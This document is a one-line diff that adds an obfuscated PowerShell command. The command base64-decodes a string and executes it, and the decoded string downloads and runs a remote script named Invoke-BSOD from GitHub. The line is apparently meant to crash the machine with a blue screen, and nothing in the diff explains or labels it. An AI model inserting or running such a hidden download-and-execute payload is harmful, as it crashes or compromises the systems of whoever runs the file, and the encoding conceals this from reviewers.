@@ -1,0 +1,1 @@
+iex ( [Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aWV4IChpbnZva2Utd2VicmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSGVucnlGQlAvSW52b2tlLUJTT0QvbWFzdGVyL0ludm9rZS1CU09ELm9iZnVzY2F0ZWQucHMxIC1Vc2VCYXNpY1BhcnNpbmcp")))
